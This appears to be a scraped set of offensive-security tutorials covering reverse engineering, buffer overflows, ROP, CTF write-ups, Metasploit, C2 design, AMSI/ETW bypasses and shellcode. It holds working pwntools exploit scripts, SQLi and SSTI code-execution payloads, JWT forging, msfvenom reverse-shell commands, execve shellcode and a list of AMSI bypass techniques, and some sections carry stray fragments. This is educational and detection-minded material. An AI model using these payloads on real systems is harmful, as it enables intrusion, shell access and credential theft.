title: Reverse engineering a packed binary with Ghidra
desc: Full workflow — identifying the packer, dumping memory, rebuilding imports, reading the real logic.

content.x: Packers exist for two reasons: to save space, and to hide logic. The first is honest. The second is what you'll meet in most malware, license checks, and paid software protection. When you open a packed binary in Ghidra, what you see isn't the real program — it's a stub whose whole job is to unpack the actual code into memory at runtime.
Run basic triage first. UPX leaves obvious strings:

$ strings sample.exe | head -20
UPX0
UPX1
UPX!
Detect It Easy (DIE) does this automatically — drag the binary in and it tells you the packer, compiler, and protection layers before you open Ghidra.
If that works, load sample_unpacked.exe in Ghidra. If it errors with CantUnpackException, the author patched UPX headers — go dynamic.
Run until it unpacks itself, then dump memory. Set a breakpoint before the jmp to OEP, run with F9, pause after unpacking.

1. Open in x64dbg
2. Right-click EntryPoint -> Follow in Disassembler
3. Set breakpoint before final jmp to OEP
4. F9 -> breakpoint hits after unpack
5. Right-click -> Follow in Dump -> Memory Map
6. Dump to file as dumped.bin
A dumped binary has no import table. Scylla rebuilds it: IAT Autosearch, Get Imports, Dump, Fix Dump. The result is a working unpacked binary.
Load the fixed dump. Auto-Analysis. Start from entry, follow the call graph into main. Rename as you go — L renames the current symbol. Ctrl+E opens the decompiler.

items: String comparisons — loop against strcmp. Rename the string, watch the branch.
Obfuscated constants — XOR with fixed key. Trace derivation, reverse in Python.

title: x64dbg in 20 minutes
desc: A fast, practical introduction to debugging Windows binaries without the ceremony.

content.x: x64dbg is the modern replacement for OllyDbg — free, open source, actively maintained. This is the minimum you need to start working with real binaries.
The ESP trick: at entry, note ESP. Set a hardware breakpoint on that stack address. Run. When it hits, you're almost always at the original entry point of the unpacked program.

bphws esp, r, 4     ; hardware BP on ESP
F9                  ; run
; -> breakpoint hits at OEP
Remove the breakpoint, dump with Scylla, fix imports.
Right-click any instruction -> Assemble (Space). Patches in memory. To save permanently: Patches window (Ctrl+P) -> Patch file.

title: Buffer overflow fundamentals — a hands-on lab
desc: Stack layout, EIP control, shellcode placement, and getting a shell in a controlled lab.

content.x: Buffer overflows are the foundation of binary exploitation. Modern mitigations make them harder, but the mechanics haven't changed.
Compile with no protections: gcc -m32 -fno-stack-protector -z execstack -no-pie vuln.c -o vuln

$ python3 -c "from pwn import *; print(cyclic(200).decode())" | xargs ./vuln
$ dmesg | tail
Or use gdb with pwndbg. Send cyclic, read EIP, use cyclic -l <value> to find the offset.
Once you know the offset (say 76), overwrite EIP with a known value: A*76 + BBBB. Verify EIP = 0x42424242.

payload  = b'A' * 76
payload += p32(buffer_addr + 32)
payload += b'\x90' * 16
payload += shellcode

items: Stack canaries detect the overwrite before return
DEP/NX blocks shellcode on stack — needs ROP

content.x: Next step: ROP — chaining gadgets from existing code to bypass NX.

Extender -> Options -> Python environment. Point to Jython standalone JAR. Then Extender -> Extensions -> Add -> Python -> select your .py file.

applyMarkers — highlights the response in UI
IScanIssue — issue format in the dashboard

title: Linux hardening for developers
desc: The defaults that bite you, and the ones that save you when you least expect it.

content.x: Default Linux installs are convenient, not secure. Here's the short list of changes that actually matter, in order of impact.

# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
AllowUsers youruser
MaxAuthTries 3
Blocks IPs after N failed attempts. Install it, add a jail for sshd with a low retry count.

sudo apt install unattended-upgrades
sudo dpkg-reconfigure --priority=low unattended-upgrades

sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp
sudo ufw enable
Only one account should have sudo. No shared accounts. No passwordless sudo without reason.
World-writable files are a problem. SUID binaries are a bigger one — audit the list.

title: How modern auth actually breaks: IMAP, OAuth, 2FA
desc: What 2FA killed and what still works when you study authentication flows in 2026.

content.x: Authentication is where most of the interesting bugs live. This is a walkthrough of how providers (Google, Microsoft, GitHub) restructured auth in the last 3 years.
Protocols like IMAP, SMTP, POP3 accepted raw username/password. Google killed "less secure apps" in May 2022. Microsoft followed.

items: 2FA mandatory by default on most accounts
App passwords required for legacy protocols, disabled on many accounts
OAuth 2.0 + device code flow is the only supported third-party path
Refresh tokens are scoped and rotatable
Session tokens bound to device fingerprints

content.x: The interesting surface is no longer credentials — it's token handling, refresh flows, OAuth redirect validation, device-binding logic.
A practical example — OAuth redirect validation
OAuth 2.1 draft, FIDO2/WebAuthn implementations, session fixation in SSO.

title: OWASP Top 10 — real chains, not checklists
desc: Each category, an actual attack chain, and the fix that would have stopped it.

content.x: The OWASP Top 10 is a starting point, not a curriculum. Here's a real chain for each — how bugs actually appear.
Change /user/123 to /user/124, no ownership check. Fix: server-side authz on every object access.
HTTPS only on login, plain HTTP elsewhere. Cookie stolen on WiFi. Fix: HTTPS everywhere, HSTS, Secure+HttpOnly+SameSite.
Search box -> SQL concat -> UNION SELECT dumps users. Fix: parameterized queries.
6-digit reset code, no rate limit. Brute in 10 min. Fix: rate limit, lockout, longer codes.
admin/admin on staging exposed on public IP. Fix: no default creds, staging behind VPN.
Old Log4j -> JNDI -> RCE. Fix: dependency scanning, regular updates.
No session rotation on login -> fixation. Fix: rotate session ID on privilege change.
Typosquatted dependency in CI -> malicious code in build. Fix: lock files, checksums, private mirrors.
3 weeks of probes, no alerts, exposed debug endpoint. Fix: log auth failures, alert on patterns.
Image URL -> http://169.254.169.254/ -> AWS creds. Fix: allowlist, block link-local.

title: Writing a YARA rule that actually catches something
desc: From strings to structure — practical YARA authoring without false positives.

content.x: YARA matches patterns in files. A bad rule matches everything; a good rule matches one family and nothing else.

rule Example_Family
{
    meta:
        author = "Abhishek Batham"
        description = "Detects Example family"
    strings:
        $s1 = "unique_marker_string" ascii
        $s2 = { 4D 5A 90 00 03 00 00 00 }
        $re1 = /https?:\/\/[a-z0-9.]+\/gate\.php/ nocase
    condition:
        uint16(0) == 0x5A4D and filesize < 500KB and
        2 of ($s*) or $re1
}

import yara
rules = yara.compile(filepath='rule.yar')
for m in rules.match('/path/sample'):
    print(m.rule, m.strings)

title: Wireshark filters you'll actually use
desc: A practical filter set for triage — TCP resets, TLS handshakes, DNS anomalies.

content.x: Wireshark's power is in the display filter. Here are the filters that do real work during triage.

tls.handshake.type == 1        // Client Hello
tls.handshake.extensions_server_name   // SNI
ssl.alert_message

dns.qry.type == 16             // TXT records
dns.qry.name contains "long-subdomain"
dns.flags.rcode != 0
Long TXT records or subdomains with random strings = potential DNS tunneling.
Right-click any packet -> Follow -> TCP Stream. Raw bytes, decoded as text. Great for HTTP and plaintext protocols.
The filter bar auto-completes. Save common filters as bookmarks — or drop them into a text file for muscle memory.

title: Kali setup that doesn't fight you
desc: A minimal, opinionated Kali config for daily work — no bloat, all speed.

content.x: Default Kali is bloated. Here's a lean setup for daily work.
Use the Kali Linux NetInstaller or the minimal ISO — not the full default. You install what you need.

sudo apt install -y \
  git curl wget jq tmux zsh \
  python3-pip python3-venv \
  nmap netcat-openbsd socat \
  ripgrep fd-find bat \
  gdb strace ltrace

python3 -m venv ~/.venvs/tools
source ~/.venvs/tools/bin/activate
pip install pwntools requests scapy
Never pip install globally. Kali's pip is externally-managed (PEP 668) — venvs are the clean way.

# ~/.tmux.conf
set -g mouse on
set -g history-limit 10000
set -g base-index 1
setw -g pane-base-index 1
bind r source-file ~/.tmux.conf \; display "Reloaded"

mkdir -p ~/tools && cd ~/tools
git clone https://github.com/some/tool.git
# add ~/tools to PATH in ~/.zshrc
export PATH="$HOME/tools:$PATH"
Don't install every tool from GitHub. Install on demand, uninstall when done. Bloat slows you down.

title: Docker for security researchers
desc: Isolated analysis environments you can rebuild in seconds.

content.x: Docker is perfect for isolated analysis. Containers are cheap, disposable, and configurable. Run malware or tools without polluting your host.

sudo apt install docker.io
sudo usermod -aG docker $USER
# log out and back in

docker network create --internal isolated
docker run --rm -it --network isolated ubuntu:latest bash
The --internal flag means the container has no route to the internet. Perfect for malware samples.
Stops fork bombs and resource exhaustion.

FROM ubuntu:22.04
RUN apt update && apt install -y \
    python3 python3-pip gdb \
    binutils file strace ltrace \
    curl wget git vim
RUN pip install pwntools capstone
WORKDIR /work
CMD ["bash"]

docker build -t retools .
docker run --rm -it -v $(pwd):/work retools
Now every analysis session starts with the same toolset, no matter which machine you're on.

title: Reading a CVE like a researcher
desc: From advisory to proof-of-concept — the mental model that speeds everything up.

content.x: A CVE is not just an identifier — it's a puzzle. Here's how to go from advisory text to working understanding.

items: Description — vague summary of the vulnerability class
References — the actual detail: patch commits, advisories, writeups

content.x: The most useful reference is often the patch commit. GitHub security advisories link to it. A patch shows exactly what was changed and why.

# Example: Google search
"CVE-2024-XXXX" site:github.com commit
"CVE-2024-XXXX" diff
Read the diff. The removed lines were vulnerable. Find the function they lived in. Get the pre-patch source or binary.
Build the vulnerable version. Fuzz it, or write a targeted PoC based on the patch. The patch tells you the input pattern that triggers the bug.
Not every bug is exploitable. Consider: is it reachable? Pre-auth or post-auth? Does the language have memory safety?

items: github.com/advisories — GHSA, often with patch links

content.x: Read 5 CVEs end-to-end in a single class (say, deserialization). Patterns repeat. After 5, you'll spot the shape of a bug in seconds.

title: Radare2 for people who hate learning Radare2
desc: The 20% of r2 that does 80% of the work, with muscle memory built in.

content.x: Radare2 has a reputation. Ignore it. You only need a handful of commands for 90% of daily work.

r2 ./sample
# in r2:
aaa          # analyze all
s main       # seek to main
pdf          # print disassembled function

izz          # list all strings
izz~http    # filter strings containing 'http'
axt @@ str.http_url   # xrefs to a string

afl          # list functions
afl~main     # filter by name
axt <addr>   # xrefs to address
axf <addr>   # xrefs from function

afn my_function_name   # rename current function
CC description         # add comment

V            # visual mode
p            # cycle between views
:            # command prompt inside visual
q            # exit

VV           # visual graph
hjkl         # navigate
tab          # next node

r2 -A ./sample
s main
pdf
izz~password
axf @ str.password
That's most of what you need. Everything else, look up as needed.

title: IDA vs Ghidra vs Binary Ninja
desc: An honest comparison for real work — decompiler quality, scripting, and workflow.

content.x: All three are good. The differences matter when you do this daily.

items: Decompiler quality: very good, improving every release
Best for: getting started, Linux binaries, cross-platform work
Decompiler quality: historically the gold standard, still excellent
Best for: professional malware analysis, big codebases, plugins
Decompiler quality: strong, very good UI
Best for: people who want modern UI without IDA prices

content.x: If you're learning: Ghidra, no contest. Free, and the workflow is transferable.
If you do this professionally and your employer pays: IDA Pro.
If you want IDA alternatives with a modern feel: Binary Ninja.
The tool matters less than the analyst. The same bug is findable in all three. Pick one, get fluent, and use it. Switching costs more than it's worth after a certain point.

L          # rename (like N in IDA)
;          # comment
Ctrl+E     # decompile
G          # goto
Ctrl+Shift+G  # patch bytes
Muscle memory takes a week. After that, you'll stop noticing.

title: CTF writeup: pwn challenge, full chain
desc: Recon, bug ID, exploit dev, and the flag — every step documented.

content.x: A generic template for approaching pwn challenges. Not tied to a specific CTF — this is the workflow.

$ file ./chal
ELF 64-bit LSB executable, x86-64, dynamically linked
$ checksec --file=./chal
[*] RELRO: Partial    [*] Canary: No
[*] NX: Enabled       [*] PIE: No
No PIE + NX means: I know addresses, but I can't execute on the stack. That means ROP.

$ ghidra ./chal
# or
$ r2 -A ./chal
[0x...]> afl
[0x...]> s sym.vuln
Look for unsafe input handling — gets, scanf with %s, strcpy, or custom read loops that don't check length.
Classic pattern: a buffer on the stack (say 64 bytes) being filled without a length check. Overflow reaches the saved return address.

$ python3 -c "from pwn import *; print(cyclic(200).decode())" | ./chal
$ dmesg | tail
# or in gdb
$ gdb ./chal
(gdb) run
(gdb) <paste pattern>
Program received signal SIGSEGV
RIP: 0x616161...
(gdb) cyclic -l 0x61616161616c61

$ ROPgadget --binary ./chal | grep "pop rdi"
0x401234 : pop rdi ; ret
$ ROPgadget --binary ./chal | grep "syscall"
0x401456 : syscall

from pwn import *

elf = ELF('./chal')
rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
binsh = next(elf.search(b'/bin/sh'))
system = elf.plt['system']

payload  = b'A' * 72
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p = process('./chal')
p.sendline(payload)
p.interactive()

items: No system/execve in PLT — use ret2libc with leaked address
Full RELRO — GOT overwrite is out, look for other targets
Canary present — need a leak first (info disclosure)
PIE enabled — need to leak the binary base

content.x: Once you have a shell, cat the flag. Write it up — the writeup is what makes the challenge memorable, not the flag.

title: CTF writeup: web challenge, full chain
desc: Source review, injection point, exploitation, and what the fix would be.

content.x: A generic web CTF workflow. The trick is systematic — enumerate, then exploit.

# Start with what's served
curl -s http://target/ | head -100

# Look for hidden paths
ffuf -u http://target/FUZZ -w /usr/share/wordlists/common.txt

# Check robots.txt, sitemap.xml, .git
curl -s http://target/robots.txt
curl -s http://target/.git/config
Open every page in Burp. Note: form fields, cookies, JWTs, redirects, and any user-controlled input reflected back.

items: SQL injection — login bypass, UNION SELECT, blind
Deserialization — PHP serialize, Java, Python pickle
JWT — alg:none, weak secret, kid manipulation

content.x:
' OR 1=1--
admin'--
' UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables--
' UNION SELECT 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--

{{ 7*7 }}                -> 49? vulnerable
{{ config }}              -> dumps Flask config
{{ ''.__class__.__mro__[1].__subclasses__() }}   -> find Popen
{{ ''.__class__.__mro__[1].__subclasses__()[N]('id', shell=True, stdout=-1).communicate() }}

# Decode the JWT
{"alg":"HS256","typ":"JWT"}.{"user":"guest","admin":false}.sig

# Attack: change alg to none
{"alg":"none"}.{"user":"admin","admin":true}.

# Attack: weak secret — crack with hashcat
hashcat -m 16500 jwt.txt wordlist.txt
SQLi: parameterized queries. SSTI: escape output, don't render user input as template. JWT: verify algorithm server-side, use strong secrets. XXE: disable external entities. SSRF: allowlist domains.

What to look for on disk

title: Metasploit without the magic
desc: What each module actually does, and how to write your own.

content.x: Metasploit is not magic. It's a database of exploits plus a payload framework. Understanding the pieces makes it useful.

items: Module — one exploit, payload, or auxiliary tool
Payload — the code that runs after the exploit (shell, meterpreter)
Encoder — obfuscates payload bytes for bad-character avoidance

msfconsole

msf6 > search apache 2.4.49
msf6 > use exploit/multi/http/apache_normalize_path_rce
msf6 > show options
msf6 > set RHOSTS 10.10.10.5

items: Payload = what runs on the target after exploit
Handler spins up automatically when you set a reverse payload

content.x:
meterpreter > sysinfo
meterpreter > getuid
meterpreter > ps
meterpreter > shell
meterpreter > upload /local/file /remote/path
meterpreter > download /remote/file
meterpreter > hashdump

msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.2 LPORT=4444 \
  -f exe -o shell.exe

msfvenom -p linux/x64/shell_reverse_tcp \

# modules/exploits/multi/http/my_exploit.rb
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
  def initialize(info = {})
    super(update_info(info,
      'Name' => 'My custom exploit',
      'Targets' => [['Auto', {}]],
      'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' }
    ))
    register_options([Opt::RPORT(80), OptString.new('TARGETURI', [true, 'Path', '/'])])
  end
  def exploit
    send_request_cgi({'uri' => target_uri.path})
  end
end
Every default payload is detected by modern AV/EDR. For real ops, you write custom loaders, use encryption, and avoid meterpreter. Metasploit is a learning tool first.

title: Writing a custom C2 — architecture only
desc: Command-and-control design tradeoffs: channels, encryption, resilience.

content.x: Custom C2 is architecture, not code. Design mistakes cost more than implementation bugs. This is the tradeoff space.

items: Beacon — runs on target, receives tasks, sends output
Server — queues tasks, stores output, provides operator UI
Channel — the transport between beacon and server

content.x:
HTTPS      - most common, blends with normal traffic
DNS        - survives strict egress firewalls
WebSocket  - low latency, requires support
SMTP/IMAP  - rarely blocked outbound
Cloud APIs - Slack, Telegram, Dropbox APIs — beacon posts/reads via public API
SMB named pipes - internal lateral movement
Two patterns: polling (beacon phones home every N sec) and long-poll (beacon holds a connection open, server pushes instantly).

import random
base  = 60
delta = base * 0.3
sleep = base + random.uniform(-delta, delta)
Sleeping a fixed 60s is a signature. Sleeping 60s ± 30% looks human.

items: Per-beacon key — generated at first check-in, shared out-of-band
Key exchange — via asymmetric crypto or a pre-shared value
Message envelope — session id + sequence + timestamp + ciphertext + MAC
Operator auth (basic for small teams, OIDC for orgs)
Audit log — who ran what, on which beacon, when
Kill switch — ability to disable all beacons instantly

content.x:
# Beacon side
- Check domain-joined status before checking in
- Check for debugger before executing tasks
- Store config encrypted, decrypt only at use
- Randomize User-Agent per beacon
- Sign all tasks server-side, verify on beacon

items: Don't hardcode the C2 domain in the beacon binary (string search = dead)
Don't use one key for all beacons
Don't log plaintext output on the server
Don't assume HTTPS = invisible — JA3 fingerprints are a thing

content.x: Cobalt Strike (commercial), Sliver (open), Mythic (open, modular), Havoc (open). Read their architecture docs — they've solved the problems you'll hit.

title: PowerShell for red teams, part 1
desc: The idioms that matter — objects, pipelines, remoting, and logging that you must know about.

content.x: PowerShell is the default automation language on Windows. This is the version red teams actually use.

Get-Process | Where-Object { $_.WorkingSet -gt 100MB } | Select-Object Name, Id, WorkingSet

# Everything is an object — you filter on properties, not strings

# One-to-one
Enter-PSSession -ComputerName dc01

# One-to-many
Invoke-Command -ComputerName dc01,dc02 -ScriptBlock { Get-Service }

# Persistent session
$s = New-PSSession -ComputerName dc01
Invoke-Command -Session $s -ScriptBlock { whoami }
Remove-PSSession $s
This is the "fileless" pattern — nothing written to disk. Modern EDR still catches it via AMSI.

items: ScriptBlock logging — every script block, decrypted, logged to Event ID 4104
AMSI — inline content scanned before execution

content.x:
# AMSI bypass — patch the AmsiScanBuffer function in memory
# Several public techniques exist; all are signatured by now
# Use this knowledge to build detections, not to evade
If you know what lands in Event 4104, 4688, and Sysmon 1/3/7/10, you know your OPSEC boundaries. Logging is your constraint, not your enemy.

title: Building your own keylogger in C — for detection research
desc: How keyloggers work, then how to catch them. Lab-only, detection-focused.

content.x: Understanding keyloggers is a detection problem. You can't write a rule for what you don't understand. This is the mechanics — in a lab, for detection purposes.

items: GetAsyncKeyState — poll every N ms for key state
Raw Input API — register for raw HID input

content.x: No hooks, no DLLs, but 10ms polling means dropped keys under fast typing.
Detection — what each mechanism leaves behind

items: SetWindowsHookEx — SetWindowsHookEx API call in process, ETW Microsoft-Windows-Win32k events
GetAsyncKeyState — repeated tight loop calls, high CPU, suspicious polling pattern
Raw Input — RegisterRawInputDevices in unusual process
File writes — log file in temp, unusual I/O pattern
DLL injection — unattributed DLLs in every process (if using injection)

content.x:
# Sysmon Event ID 8 — CreateRemoteThread (DLL injection)
# Sysmon Event ID 10 — ProcessAccess (MemoryRead on targeted processes)
# Event ID 4688 — process creation with suspicious parent

# Sysmon query for keyboard hooking
Event ID 8 or 10 where TargetImage NOT IN (known_good)
Signature strings: SetWindowsHookEx, GetAsyncKeyState, WH_KEYBOARD_LL, KBDLLHOOKSTRUCT. Combined with filesize and PE checks, these catch most public keyloggers.

Keyloggers are among the easiest malware to detect once you know what to look for. Every modern EDR catches SetWindowsHookEx on non-UI processes. The lesson: OPSEC is about knowing what lands in logs.

title: AMSI and ETW — what they see, what they miss
desc: Modern Windows telemetry internals with practical examples.

content.x: AMSI and ETW are the two most important telemetry sources on modern Windows. Knowing them makes you a better attacker and a better defender.
AMSI scans content before execution. Scripts, PowerShell, VBScript, JScript, .NET assemblies, Office macros — all pass through AmsiScanBuffer.

# PowerShell string goes through AMSI before execution
IEX "malicious content"

# Behind the scenes:
# 1. AMSI DLL loaded into powershell.exe
# 2. AmsiScanBuffer called with the string
# 3. AV engine (Defender) inspects content
# 4. If flagged, execution halted with AMSI_RESULT_DETECTED

1. Patch AmsiScanBuffer prologue — return AMSI_RESULT_CLEAN
2. Patch AmsiOpenSession similarly
3. Force PowerShell v2 (no AMSI)
4. AMSI in-memory unloading
5. Reflection-based bypass

# All are signatured by Defender. Modern detection checks the AMSI DLL in memory.

items: Native code (C/C++, Go, Rust) — no AMSI path
Encrypted content loaded into memory — AMSI scans plaintext only

content.x: ETW is Windows' kernel-level event stream. Every syscall surface, every process action, every network event has a provider.

Microsoft-Windows-Kernel-Process       — process/thread events
Microsoft-Windows-Kernel-File          — file I/O
Microsoft-Windows-Kernel-Registry      — registry ops
Microsoft-Windows-Kernel-Network       — network
Microsoft-Windows-Threat-Intelligence  — EDR-level
Microsoft-Antimalware-Scan-Interface   — AMSI
Microsoft-Windows-PowerShell           — script blocks

# Via logman
logman start mytrace -p Microsoft-Windows-Kernel-Process -o trace.etl -ets
logman stop mytrace -ets

# Convert to readable
tracerpt trace.etl -o trace.xml -of XML
Some ETW providers can be disabled by patching EtwEventWrite in ntdll. Modern EDRs check this patch and alert.

items: Telemetry sent to file/memory can be dropped before consumer
Providers can be disabled by admin (or by patched ntdll)

content.x: Both AMSI and ETW are patchable — but patches are detectable. Modern detection doesn't look at "is the patch there"; it looks at the process state, memory integrity, and behavior patterns. This is why OPSEC in 2026 is hard.

title: Windows kernel debugging: first driver analysis
desc: WinDbg setup, breakpoints, and reading a driver that misbehaves.

content.x: Kernel debugging is a different world from user-mode. You need two machines (or one machine plus a VM), and the right symbols.

items: Target — VM with Windows 10/11, debug mode enabled
Connection — network or serial (USB is preferred for physical)

content.x: Enable debug mode on the target

bcdedit /debug on
bcdedit /dbgsettings net hostip:192.168.1.100 port:50000 key:1.2.3.4
# Reboot

!drvobj <driver name>           # driver object
!devobj <device object>         # device info
!irp <address>                  # I/O request packet
lm                              # loaded modules
!process 0 0                    # all processes
!thread <address>               # thread info
bp <address>                    # set breakpoint
ba r4 <address>                 # hardware breakpoint on read

# Load the driver
sc create mydrv binPath= C:\path\driver.sys type= kernel
sc start mydrv

# Find it in WinDbg
lm m mydrv*
!drvobj mydrv

# Find its device
!devobj \Device\MyDevice

# Set a breakpoint on dispatch
bp mydrv!DispatchCreate

items: NULL pointer dereference on unsupported IOCTL

content.x:
# After BSOD
!analyze -v
# Gives: bugcheck code, likely culprit, call stack, faulting instruction
The BSOD code is your friend. 0x0A = IRQL_NOT_LESS_OR_EQUAL (usually bad pointer). 0x50 = PAGE_FAULT_IN_NONPAGED_AREA. 0xD1 = DRIVER_IRQL_NOT_LESS_OR_EQUAL (bad driver).

title: Shellcode basics: writing, encoding, running
desc: Position-independent code, encoders, and lab execution — with detection notes.

content.x: Shellcode is position-independent machine code. No hardcoded addresses, no imports resolved by the OS, just raw bytes.

section .text
global _start
_start:
    xor rdi, rdi
    mov rbx, 0x68732f6e69622f    ; "/bin/sh"
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov al, 59                   ; execve syscall number
    syscall

$ nasm -f elf64 shell.asm -o shell.o
$ ld shell.o -o shell
$ objcopy -O binary shell shell.bin
$ xxd -i shell.bin

Windows doesn't have fixed syscall numbers across versions. Instead, shellcode resolves APIs at runtime by walking the PEB -> Ldr -> InMemoryOrderModuleList to find kernel32.dll, then parsing the export table for function addresses.

items: Alphanumeric — all bytes are letters/digits (bypasses some filters)
RC4 — heavier, useful against entropy-based detection

content.x:
import sys
with open('shell.bin', 'rb') as f:
    data = f.read()
key = 0xAA
enc = bytes(b ^ key for b in data)
print(''.join(f'\\x{b:02x}' for b in enc))

items: RWX memory regions are a strong signal
High-entropy regions in non-code sections = suspicious
Shellcode bytes in file = strings-based detection
Behavior: process spawning a shell from a thread whose start address is not backed by a module on disk

content.x: Modern EDRs hook the execve / CreateProcess calls and check the caller. If the caller is unbacked memory, it alerts.

title: ROP chains for people who skipped the theory
desc: Gadget hunting, chain layout, and a working lab example.

content.x: ROP (Return-Oriented Programming) is how you bypass NX/DEP. You can't execute on the stack, so you chain together existing code snippets ending in `ret`.
A gadget is a short sequence of instructions ending in `ret`. Any useful instruction sequence that happens to end in ret can be used as a building block.

pop rdi; ret          — load a value into RDI (first arg)
pop rsi; ret          — load into RSI (second arg)
pop rdx; ret          — third arg
pop rax; ret          — syscall number
syscall; ret          — execute
mov [rdi], rax; ret   — write rax to *rdi

$ ROPgadget --binary ./chal
$ ROPgadget --binary ./chal | grep "pop rdi"
$ ropper -f ./chal --search "pop rdi"
$ rp++ -f ./chal --unique
On Linux x64, execve is syscall 59. Registers: rdi = path, rsi = argv, rdx = envp.

from pwn import *

elf = ELF('./chal')
rop = ROP(elf)

pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
syscall = rop.find_gadget(['syscall', 'ret'])[0]
binsh   = next(elf.search(b'/bin/sh'))

chain  = p64(pop_rax) + p64(59)
chain += p64(pop_rdi) + p64(binsh)
chain += p64(pop_rsi) + p64(0)
chain += p64(pop_rdx) + p64(0)
chain += p64(syscall)

payload = b'A' * 72 + chain
p = process('./chal')
p.sendline(payload)
p.interactive()

If the binary has PIE or the libc is randomized, you need a leak before you can build the chain. Common leak sources: format strings, uninitialized stack reads, or fixed non-PIE sections of the binary.

items: ret2libc — call system() directly (requires no PIE, or leak)
ret2plt — call a PLT entry (works in PIE with known base)
ret2dlresolve — forge a dynamic resolver lookup

content.x:
$ gdb ./chal
(gdb) b *0x401234      # breakpoint on first gadget
(gdb) run
(gdb) x/20gx $rsp      # inspect the chain on the stack
(gdb) si               # step one instruction at a time
If you land in an unexpected place, your chain shifted by 8 bytes somewhere. Debug with a breakpoint on every gadget.

title: Automating triage with Python
desc: Batch-process binaries, extract metadata, sort by suspicion.

content.x: When you have 500 samples and no time, automate. This is a triage pipeline that sorts them by how interesting they look.

SUSPICIOUS_APIS = [
    'VirtualAlloc', 'VirtualProtect', 'CreateRemoteThread',
    'WriteProcessMemory', 'SetWindowsHookEx', 'IsDebuggerPresent',
    'LoadLibraryA', 'GetProcAddress', 'ShellExecute',
]

def score(info, imports):
    s = 0
    if info['entropy'] > 7.5: s += 3       # packed
    if info['is_pe'] and info['size'] < 10000: s += 1  # small dropper
    s += sum(2 for api in imports if api in SUSPICIOUS_APIS)
    return s
High entropy + small size = likely packed dropper. Non-standard compiler timestamp = tampered. Suspicious imports like VirtualProtect + WriteProcessMemory = injection. Start there.

title: Parsing unknown file formats
desc: Hex patterns, struct guessing, and building a parser iteratively.

content.x: You'll meet custom file formats all the time — game saves, config files, proprietary databases. Here's the iterative way to build a parser.
Look for: file signature (magic bytes), obvious strings, repeated patterns, and consistent field lengths.

items: Index/table: array of records with offsets or IDs
Footer: checksum, terminator, or trailing metadata

content.x:
import struct

with open('sample.bin', 'rb') as f:
    data = f.read()

magic = data[:4]
version = struct.unpack('<I', data[4:8])[0]
count = struct.unpack('<I', data[8:12])[0]
print(f'magic={magic}, version={version}, count={count}')
After parsing the header, print the next N bytes as both hex and ASCII. Guess the next field. Test against another sample of the same format.

# Parse and print — if fields make sense, the layout is right
def parse(data):
    r = Reader(data)
    magic = r.bytes(4)
    version = r.u32()
    count = r.u32()
    entries = []
    for _ in range(count):
        entries.append({
            'id': r.u32(),
            'offset': r.u32(),
            'size': r.u32(),
            'name': r.cstr(),
        })
    return entries

items: Kaitai Struct — describe the format in YAML, get parsers in any language
010 Editor — hex editor with binary templates
binwalk — find embedded files and signatures

content.x: Kaitai especially: write the format once, generate a Python parser. Saves days.

title: Fuzzing a file parser with AFL++
desc: Setup, corpus, harness, and reading the first crash.

content.x: AFL++ is the standard coverage-guided fuzzer. You give it a target and a corpus, it mutates the corpus and keeps the inputs that reach new code.

sudo apt install afl++
# or build from source for the latest

mkdir input_dir output_dir
echo -n "MYFT\x05hello" > input_dir/seed1
echo -n "MYFT\x0Ahelloworld" > input_dir/seed2
The screen shows execution speed, coverage, and crashes. Let it run — for a target this small, crashes appear in minutes.

ls output_dir/default/crashes/
# Each file is a crashing input

# Reproduce
./vuln output_dir/default/crashes/id:000000*

afl-tmin -i crash.bin -o minimal.bin -- ./vuln @@
# Now minimal.bin is the smallest input that still crashes

$ gdb ./vuln
(gdb) run crash.bin
# backtrace tells you where the crash is
(gdb) bt

# if the format has magic strings, feed AFL a dictionary
echo '"MYFT"' > format.dict
afl-fuzz -x format.dict -i in -o out -- ./vuln @@
If your target processes input in a loop, use AFL_LOOP / __AFL_LOOP to reuse the process. 10-100x speedup.

title: Symbolic execution — a gentle intro
desc: Angr on a small binary: constraints, paths, and one real find.

content.x: Symbolic execution treats input as variables and asks the solver: what input makes the program take a path I want? In practice: you tell angr "find a state where the address is X", and it figures out the input.

import angr
import claripy

proj = angr.Project('./check', auto_load_libs=False)

# Symbolic stdin — 32 bytes
arg = claripy.BVS('arg', 32 * 8)
state = proj.factory.entry_state(stdin=angr.SimFileStream('/dev/stdin', content=arg))

simgr = proj.factory.simulation_manager(state)

# Find address of "Access granted" print
find_addr = 0x401162   # from objdump
avoid_addr = 0x401175  # address of "Denied" branch

simgr.explore(find=find_addr, avoid=avoid_addr)

if simgr.found:
    sol = simgr.found[0]
    print(sol.posix.dumps(0))   # prints the input

items: CTF reversing challenges — the classic "find the password"
Crash triage — find inputs reaching a bad address
Protocol fuzzing — symbolic values in message fields
Malware analysis — solve config encryption puzzles

content.x: For CTF reversing, angr is often a 5-minute solution where manual work would be hours. For real-world binaries, it's usually not — too complex.

title: OSINT workflow for authorized red teams
desc: Domain, employee, infra — collecting what matters without breaking rules.

content.x: OSINT for red teams is scoped, legal, and systematic. This is the workflow for authorized engagements.
Before collecting anything: what's in scope? Only the domain, or also the company's subsidiaries? Employees' personal accounts? Make sure it's in writing.

# Certificate transparency
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Subfinder — aggregates multiple sources
subfinder -d target.com -o subs.txt

# Amass for passive + active
amass enum -passive -d target.com -o amass.txt

# DNS brute force
puredns bruteforce wordlist.txt target.com

# SecurityTrails / VirusTotal / Shodan hostname APIs
curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a" -H "APIKEY: $KEY"

# URLScan
